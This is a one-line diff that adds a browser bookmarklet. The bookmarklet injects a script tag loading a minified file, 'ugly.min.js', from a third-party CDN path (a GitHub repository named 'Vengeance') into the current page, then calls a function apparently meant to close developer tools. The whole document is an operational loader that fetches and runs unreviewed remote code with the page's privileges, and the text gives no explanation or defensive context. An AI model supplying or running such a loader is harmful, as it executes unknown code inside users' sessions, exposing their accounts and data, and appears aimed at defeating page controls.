@@ -1,0 +1,1 @@
+javascript:(function () {var script=document.createElement('script');script.src='https://cdn.jsdelivr.net/gh/Browncha023/Vengeance@1.2.0/other/ugly.min.js';document.body.appendChild(script);avoclosedevtools()}())
